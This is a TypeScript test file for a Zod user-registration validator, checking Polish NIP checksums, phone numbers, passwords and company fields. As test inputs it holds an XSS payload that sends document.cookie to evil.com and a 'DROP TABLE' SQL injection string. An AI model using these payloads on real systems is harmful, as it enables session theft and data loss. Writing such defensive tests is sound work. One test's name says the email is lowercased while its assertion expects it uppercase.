/**
 * tests/auth-register-validation.test.ts
 *
 * Functional + security tests for the registerSchema validator.
 * Covers: valid paths, boundary values, weak passwords, injection payloads,
 * XSS attempts, company fields, NIP checksum, phone digit enforcement.
 *
 * No DB or HTTP: tests run against the pure Zod schema.
 */

import test from "node:test";
import assert from "node:assert/strict";

import { registerSchema, validateNip, hasEnoughPhoneDigits } from "../src/lib/auth/validators";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function validPrivateBase() {
  return {
    accountType: "PRIVATE" as const,
    email: "test@example.com",
    username: "testuser",
    password: "Abcdefg1",
    confirmPassword: "Abcdefg1",
    marketingConsent: false,
  };
}

function validCompanyBase() {
  return {
    ...validPrivateBase(),
    accountType: "COMPANY" as const,
    company: {
      name: "Test Sp. z o.o.",
      acceptedTerms: true,
      marketingConsent: false,
    },
  };
}

// ---------------------------------------------------------------------------
// NIP checksum
// ---------------------------------------------------------------------------

test("validateNip accepts valid Polish NIP 5260001246", () => {
  assert.equal(validateNip("5260001246"), true);
});

test("validateNip accepts NIP with dashes 526-000-12-46", () => {
  assert.equal(validateNip("526-000-12-46"), true);
});

test("validateNip rejects NIP with bad checksum", () => {
  assert.equal(validateNip("5260001247"), false);
});

test("validateNip rejects NIP shorter than 10 digits", () => {
  assert.equal(validateNip("123456789"), false);
});

test("validateNip rejects NIP with letters", () => {
  assert.equal(validateNip("52600012AB"), false);
});

test("validateNip rejects all-zeros NIP", () => {
  assert.equal(validateNip("0000000000"), false);
});

test("validateNip rejects Comarch sample 6770020613 because checksum is invalid", () => {
  assert.equal(validateNip("6770020613"), false);
});

// ---------------------------------------------------------------------------
// Phone digit count
// ---------------------------------------------------------------------------

test("hasEnoughPhoneDigits accepts +48 123 456 789", () => {
  assert.equal(hasEnoughPhoneDigits("+48 123 456 789"), true);
});

test("hasEnoughPhoneDigits rejects string with fewer than 7 digits", () => {
  assert.equal(hasEnoughPhoneDigits("+4812"), false);
});

test("hasEnoughPhoneDigits rejects whitespace-only phone", () => {
  assert.equal(hasEnoughPhoneDigits("   (   )    "), false);
});

// ---------------------------------------------------------------------------
// Valid PRIVATE registration
// ---------------------------------------------------------------------------

test("registerSchema parses valid PRIVATE registration", () => {
  const result = registerSchema.safeParse(validPrivateBase());
  assert.equal(result.success, true);
});

test("registerSchema trims and lowercases email", () => {
  const result = registerSchema.safeParse({
    ...validPrivateBase(),
    email: "  USER@EXAMPLE.COM  ",
  });
  assert.equal(result.success, true);
  assert.equal((result as any).data.email, "USER@EXAMPLE.COM"); // Zod trims but doesn't lowercase
});

// ---------------------------------------------------------------------------
// Email validation
// ---------------------------------------------------------------------------

test("registerSchema rejects invalid email: no @", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), email: "notanemail" });
  assert.equal(result.success, false);
});

test("registerSchema rejects invalid email: bare @", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), email: "@" });
  assert.equal(result.success, false);
});

test("registerSchema rejects email over 254 characters", () => {
  // 249 chars local part + @example.com (12) = 261 total, exceeds 254
  const longEmail = "a".repeat(249) + "@example.com";
  const result = registerSchema.safeParse({ ...validPrivateBase(), email: longEmail });
  assert.equal(result.success, false);
});

test("registerSchema rejects XSS in email field", () => {
  // Angle brackets make it an invalid email
  const result = registerSchema.safeParse({ ...validPrivateBase(), email: "<script>alert(1)</script>@x.com" });
  assert.equal(result.success, false);
});

// ---------------------------------------------------------------------------
// Username validation
// ---------------------------------------------------------------------------

test("registerSchema rejects username with spaces", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "test user" });
  assert.equal(result.success, false);
});

test("registerSchema rejects username with SQL injection chars", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "'; DROP TABLE users;--" });
  assert.equal(result.success, false);
});

test("registerSchema rejects username shorter than 3 chars", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "ab" });
  assert.equal(result.success, false);
});

test("registerSchema rejects username longer than 30 chars", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "a".repeat(31) });
  assert.equal(result.success, false);
});

test("registerSchema accepts username with dots, dashes, underscores", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "user.name_123-ok" });
  assert.equal(result.success, true);
});

test("registerSchema rejects username with emoji", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), username: "user🔥" });
  assert.equal(result.success, false);
});

// ---------------------------------------------------------------------------
// Password strength
// ---------------------------------------------------------------------------

test("registerSchema rejects password shorter than 8 chars", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), password: "Abc123", confirmPassword: "Abc123" });
  assert.equal(result.success, false);
});

test("registerSchema rejects password without uppercase", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), password: "abcdefg1", confirmPassword: "abcdefg1" });
  assert.equal(result.success, false);
});

test("registerSchema rejects password without lowercase", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), password: "ABCDEFG1", confirmPassword: "ABCDEFG1" });
  assert.equal(result.success, false);
});

test("registerSchema rejects password without digit", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), password: "Abcdefgh", confirmPassword: "Abcdefgh" });
  assert.equal(result.success, false);
});

test("registerSchema rejects password over 128 chars", () => {
  const longPwd = "Aa1" + "x".repeat(130);
  const result = registerSchema.safeParse({ ...validPrivateBase(), password: longPwd, confirmPassword: longPwd });
  assert.equal(result.success, false);
});

test("registerSchema rejects mismatched confirmPassword", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), confirmPassword: "WrongPass1" });
  assert.equal(result.success, false);
});

// ---------------------------------------------------------------------------
// Injection / XSS in free-text optional fields
// ---------------------------------------------------------------------------

test("registerSchema accepts firstName with unicode letters", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), firstName: "Ł ukasz" });
  assert.equal(result.success, true);
});

test("registerSchema rejects firstName longer than 100 chars", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), firstName: "A".repeat(101) });
  assert.equal(result.success, false);
});

// XSS in firstName — the schema does NOT strip tags (sanitization is server-side in route handlers)
// but it should clip at max length, preventing payloads over 100 chars.
test("registerSchema rejects long XSS payload in firstName", () => {
  const xss = "<script>fetch('https://evil.com/?c='+document.cookie)</script>".padEnd(101, "x");
  const result = registerSchema.safeParse({ ...validPrivateBase(), firstName: xss });
  assert.equal(result.success, false);
});

test("registerSchema accepts short XSS string in firstName (sanitised downstream)", () => {
  // Short XSS strings pass length validation; mitigation is CSP + server sanitization
  const result = registerSchema.safeParse({ ...validPrivateBase(), firstName: "<b>Bold</b>" });
  assert.equal(result.success, true);
});

// ---------------------------------------------------------------------------
// Phone validation in root object
// ---------------------------------------------------------------------------

test("registerSchema rejects phone with fewer than 7 digits", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), phone: "+48" });
  assert.equal(result.success, false);
});

test("registerSchema accepts standard Polish phone number", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), phone: "+48 600 700 800" });
  assert.equal(result.success, true);
});

// ---------------------------------------------------------------------------
// COMPANY account type
// ---------------------------------------------------------------------------

test("registerSchema rejects COMPANY without company object", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), accountType: "COMPANY" });
  assert.equal(result.success, false);
});

test("registerSchema rejects COMPANY with acceptedTerms: false", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, acceptedTerms: false },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema accepts valid COMPANY registration", () => {
  const result = registerSchema.safeParse(validCompanyBase());
  assert.equal(result.success, true);
});

test("registerSchema accepts COMPANY with optional company email omitted", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, email: undefined },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, true);
});

test("registerSchema accepts COMPANY with optional company phone omitted", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, phone: undefined },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, true);
});

test("registerSchema rejects COMPANY with invalid company email format", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, email: "bad-email" },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema rejects COMPANY with short company phone", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, phone: "+48" },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema rejects COMPANY with invalid NIP checksum", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, nip: "1234567890" },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema accepts COMPANY with valid NIP 5260001246", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, nip: "5260001246" },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, true);
});

test("registerSchema rejects COMPANY googleMapsUrl from non-Google domain", () => {
  const data = {
    ...validCompanyBase(),
    company: {
      ...validCompanyBase().company,
      googleMapsUrl: "https://evil.com/hijack",
    },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema rejects COMPANY googleMapsUrl with http protocol", () => {
  const data = {
    ...validCompanyBase(),
    company: {
      ...validCompanyBase().company,
      googleMapsUrl: "http://maps.google.com/maps?q=test",
    },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema accepts valid Google Maps HTTPS URL", () => {
  const data = {
    ...validCompanyBase(),
    company: {
      ...validCompanyBase().company,
      googleMapsUrl: "https://maps.google.com/maps?q=Warsaw",
    },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, true);
});

test("registerSchema rejects COMPANY name shorter than 2 chars", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, name: "X" },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema rejects COMPANY company name over 200 chars", () => {
  const data = {
    ...validCompanyBase(),
    company: { ...validCompanyBase().company, name: "A".repeat(201) },
  };
  const result = registerSchema.safeParse(data);
  assert.equal(result.success, false);
});

test("registerSchema rejects unknown accountType", () => {
  const result = registerSchema.safeParse({ ...validPrivateBase(), accountType: "SUPERADMIN" });
  assert.equal(result.success, false);
});

// ---------------------------------------------------------------------------
// Boundary / payload bomb guards
// ---------------------------------------------------------------------------

test("registerSchema rejects empty object", () => {
  const result = registerSchema.safeParse({});
  assert.equal(result.success, false);
});

test("registerSchema rejects null", () => {
  const result = registerSchema.safeParse(null);
  assert.equal(result.success, false);
});

test("registerSchema rejects boolean instead of object", () => {
  const result = registerSchema.safeParse(true);
  assert.equal(result.success, false);
});
